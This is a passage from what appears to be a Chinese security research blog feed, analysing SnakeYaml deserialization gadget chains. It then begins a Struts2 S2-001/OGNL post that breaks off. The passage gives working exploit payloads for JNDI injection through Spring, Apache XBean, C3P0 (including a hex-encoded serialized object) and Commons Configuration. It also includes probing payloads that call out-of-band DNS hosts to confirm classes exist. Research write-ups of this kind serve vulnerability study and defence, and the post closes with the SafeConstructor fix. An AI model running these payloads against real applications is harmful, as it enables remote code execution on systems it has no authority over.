<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 或者其他 Spring 版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 选择合适的版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>PropertyPathFactoryBean#setBeanFactory</code>方法中调用了this.beanFactory的<code>getBean</code>方法，而<code>SimpleJndiBeanFactory</code>的<code>getBean</code>方法中存在JNDI注入点</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743158772771-433b8527-a1d8-4a32-a00c-3a1f385a28d8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743158772771-433b8527-a1d8-4a32-a00c-3a1f385a28d8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>看到<code>SimpleJndiBeanFactory#getBean</code>方法，其中name可控，即可造成JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="keyword">return</span> getBean(name, Object.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isSingleton(name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> doGetSingleton(name, requiredType);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> lookup(name, requiredType);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (NameNotFoundException ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchBeanDefinitionException</span>(name, <span class="string">&quot;not found in JNDI environment&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (TypeMismatchNamingException ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanNotOfRequiredTypeException</span>(name, ex.getRequiredType(), ex.getActualType());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (NamingException ex) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(<span class="string">&quot;JNDI environment&quot;</span>, name, <span class="string">&quot;JNDI lookup failed&quot;</span>, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>SimpleJndiBeanFactory#getBean</code>方法中，如果想造成jndi，我们就需要走入else代码块中</p>
<p>我们看到<code>isSingleton</code>方法内，要判断shareableResources中是否包含<code>name</code>（即为我们的ldap地址），因此我们需要为shareableResources赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSingleton</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.shareableResources.contains(name);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在shareableResources的setter方法中可以看到，该setter方法是为该参数添加一个String类，我们只需要将我们的ldap地址传入即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setShareableResources</span><span class="params">(String... shareableResources)</span> &#123;</span><br><span class="line">		Collections.addAll(<span class="built_in">this</span>.shareableResources, shareableResources);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>除此之外，在<code>setBeanFactory</code>方法内，存在一些对链子有一些干扰的参数，我们只需要简单赋值即可越过</p>
<p>EXP如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YamlSpring</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean &quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;targetBeanName: \&quot;ldap://127.0.0.1:8085/WRTOPmjx\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot; propertyPath: sean,&quot;</span> +</span><br><span class="line">                <span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory &#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;shareableResources: [\&quot;ldap://127.0.0.1:8085/WRTOPmjx\&quot;]&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="aJfDU">Apache XBean</h3>

<ul>
<li>该链无版本限制</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-naming<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>链尾在<code>ContextUtil</code>内部类<code>ReadOnlyBinding</code>的<code>getObject</code>方法中，其中有一个<code>resolve</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> resolve(value, getName(), <span class="literal">null</span>, context);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>NamingManager.getObjectInstance</code>就是我们的JNDI漏洞点，我们只需要将我们的ldap地址，包装为一个<code>Reference</code>传入到该方法中，即可造成JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">resolve</span><span class="params">(Object value, String stringName, Name parsedName, Context nameCtx)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(value <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> (Reference) value;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for SimpleReference we can just call the getContext method</span></span><br><span class="line">        <span class="keyword">if</span> (reference <span class="keyword">instanceof</span> SimpleReference) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ((SimpleReference) reference).getContent();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (NamingException) <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Could not look up : &quot;</span> + stringName == <span class="literal">null</span>? parsedName.toString(): stringName).initCause(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for normal References we have to do it the slow way</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (parsedName == <span class="literal">null</span>) &#123;</span><br><span class="line">                parsedName = NAME_PARSER.parse(stringName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(reference, parsedName, nameCtx, nameCtx.getEnvironment());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException) <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Could not look up : &quot;</span> + stringName == <span class="literal">null</span>? parsedName.toString(): stringName).initCause(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这样就构造好了Reference类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;]&quot;</span></span><br></pre></td></tr></table></figure>

<p>接下来构造<code>ReadOnlyBinding</code>类（这里的第三个参数，我找到的是<code>InitialContext</code>类）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;Sean\&quot;,!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;],!!javax.naming.InitialContext &#123;&#125;]&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们将我们的类，反序列化后，调用其<code>getObject</code>方法，观察是否能执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;Sean\&quot;,!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;],!!javax.naming.InitialContext &#123;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        ContextUtil.<span class="type">ReadOnlyBinding</span> <span class="variable">load</span> <span class="operator">=</span> (ContextUtil.ReadOnlyBinding)yaml.load(payload);</span><br><span class="line">        load.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在执行<code>getObject</code>时，爆出了错误，发现是我们的<code>Context</code>有问题，这里就直接换成别的师傅那里拿来的<code>WritableContext</code>类了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210046939-c3c5eef6-0754-4868-9b29-dac6c8ae2c71.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210046939-c3c5eef6-0754-4868-9b29-dac6c8ae2c71.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>使用如下POC，调用getObject方法，即可造成JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;Sean\&quot;,!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;],!!org.apache.xbean.naming.context.WritableContext &#123;&#125;]&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210490268-f626878f-6ad8-4ad0-a8d3-32af0a94d2bc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210490268-f626878f-6ad8-4ad0-a8d3-32af0a94d2bc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>但是我们该怎么去触发这个<code>getObject</code>方法</p>
<p>其中我们找到<code>BadAttributeValueExpException</code>类，可以看到这里去调用了传入val的toString方法，而<code>ReadOnlyBinding</code>是没有<code>toString</code>方法的，那就看他的父类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>恰巧他的父类<code>Binding</code>的<code>toString</code>方法中，调用了本类的<code>getObject</code>方法，即可触发</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ReadOnlyBinding</span> <span class="keyword">extends</span> <span class="title class_">Binding</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.toString() + <span class="string">&quot;:&quot;</span> + getObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最终EXP如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\&quot;Sean\&quot;,!!javax.naming.Reference [\&quot;Sean\&quot;,\&quot;WRTOPmjx\&quot;,\&quot;http://127.0.0.1:8085/\&quot;],!!org.apache.xbean.naming.context.WritableContext &#123;&#125;]]&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210939037-ddab4274-f419-4687-ae8b-4902b5e0ab9f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743210939037-ddab4274-f419-4687-ae8b-4902b5e0ab9f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="FRPd3">C3P0 JndiRefForwardingDataSource</h3>
C3P0这条链子之前已经有了较为详细的分析，这里就不再过多赘述

<p>EXP如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0JndiRefForwardingDataSourceEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;  jndiName: \&quot;rmi://localhost/Exploit\&quot;\n&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;  loginTimeout: 0&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="zoBh0">C3P0 WrapperConnectionPoolDataSource</h3>
同样也是一条C3P0的链子，EXP如下（<font style="color:rgb(80, 80, 92);">二次反序列化的 payload</font>）

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot;</span> +  </span><br><span class="line"><span class="string">&quot;  userOverridesAsString: \&quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Gwf3k">Apache Commons Configuration</h3>
依赖如下

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>感觉这条链子逆向分析较难，我先把EXP放出来（太难了TvT）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">poc = <span class="string">&quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], \&quot;rmi://127.0.0.1:1099/Exploit\&quot;]]: 1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里是利用Map调用key的<code>hashCode</code>时所造成的利用链</p>
<p>从EXP来看，会调用<code>JNDIConfiguration#hashCode</code>方法，但是该类没有<code>hashCode</code>方法，就会向上调用，实际执行了<code>AbstractMap#hashCode</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  </span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())  </span><br><span class="line">        h += i.next().hashCode();  </span><br><span class="line">    <span class="keyword">return</span> h;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面调用<code>entrySet().iterator()</code>即调用<code>ConfigurationMap.ConfigurationSet#iterator</code>，然后回调用<code>JNDIConfiguration</code>的<code>getKeys</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;Map.Entry&lt;Object, Object&gt;&gt; iterator() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConfigurationSetIterator</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">ConfigurationSetIterator</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.keys = ConfigurationSet.<span class="built_in">this</span>.configuration.getKeys();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p><code>getKeys</code>方法会调用到<code>getBaseContext</code>方法内</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator&lt;String&gt; <span class="title function_">getKeys</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKeys(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;String&gt; <span class="title function_">getKeys</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">        String[] splitPath = StringUtils.split(prefix, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        List&lt;String&gt; path = Arrays.asList(splitPath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getContext(path, <span class="built_in">this</span>.getBaseContext());</span><br><span class="line">            Set&lt;String&gt; keys = <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">            <span class="keyword">if</span> (context != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.recursiveGetKeys(keys, context, prefix, <span class="keyword">new</span> <span class="title class_">HashSet</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.containsKey(prefix)) &#123;</span><br><span class="line">                keys.add(prefix);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> keys.iterator();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NameNotFoundException var6) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">ArrayList</span>()).iterator();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var7) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">e</span> <span class="operator">=</span> var7;</span><br><span class="line">            <span class="built_in">this</span>.fireError(<span class="number">5</span>, (String)<span class="literal">null</span>, (Object)<span class="literal">null</span>, e);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">ArrayList</span>()).iterator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这里的<code>lookup</code>方法就会造成JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Context <span class="title function_">getBaseContext</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.baseContext == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.baseContext = (Context)<span class="built_in">this</span>.getContext().lookup(<span class="built_in">this</span>.prefix == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : <span class="built_in">this</span>.prefix);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.baseContext;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="HBQzd">SnakeYaml探测</h2>
使用SPI的链子就可以完成探测工作，但是如果SPI机制被ban情况下，我们可以使用如下方法绕过

<h3 id="z8ulA">使用 Key 调用 hashCode 方法探测：</h3>
POC如下

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.net.URL [\&quot;http://ra5zf8uv32z5jnfyy18c1yiwfnle93.oastify.com/\&quot;]: 1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>我们根据urldns链可以知道key会进行<code>hashCode</code>方法的调用，之后进行urldns的解析</p>
<p>SnakeYaml在进行map的处理的时候将会对key进行hashCode处理，所以我们尝试map的格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    hashMap.put(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    hashMap.put(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">    System.out.println(yaml.dump(hashMap));</span><br><span class="line"><span class="comment">// &#123;a: a, b: b&#125;</span></span><br></pre></td></tr></table></figure>

<p>所以我们就可以按照这种使用<code>&#123; &#125;</code>包裹的形式构造map，然后将指定的URL置于key位置</p>
<h4 id="ZIHWq">探测内部类</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;!!java.util.Map &#123;&#125;: 0,!!java.net.URL [\&quot;http://tcbua9.ceye.io/\&quot;]: 1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>在前面加上需要探测的类，在反序列化的过程中如果没有报错，就说明反序列化成功了的，进而存在该类</p>
<p>这里创建对象的时候使用的是<code>&#123;&#125;</code>这种代表的是无参构造，所以需要存在有无参构造函数，不然需要使用<code>[]</code>进行赋值构造</p>
<h2 id="fafJz">漏洞修复</h2>
SnakeYaml 官方并没有把这一种现象作为漏洞看待

<p>修复方法就是通过添加<code>new SafeConstructor()</code>进行过滤，如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SnakeYaml</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2-S2-001</title>
    <url>/2025/04/10/Struts2-S2-001/</url>
    <content><![CDATA[<h1 id="A2dAE">Struts2</h1>
<h2 id="okABs">Struts2简介</h2>
Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。

<h2 id="gVTVp">OGNL表达式</h2>
对于Struts2的漏洞，ONGL表达式是相关的基础，我们来做相关了解

<h3 id="wigu8">OGNL简介</h3>
OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。

<p>它使用相同的表达式去存取对象的属性。</p>
<h3 id="grkut">环境配置</h3>
环境配置具体看这位师傅的文章了

<p><a href="https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md</a></p>
<h3 id="iq2U1">OGNL表达式</h3>
<h4 id="XNDha">OGNL三要素</h4>

<ul>
<li>表达式（Expression）</li>
</ul>
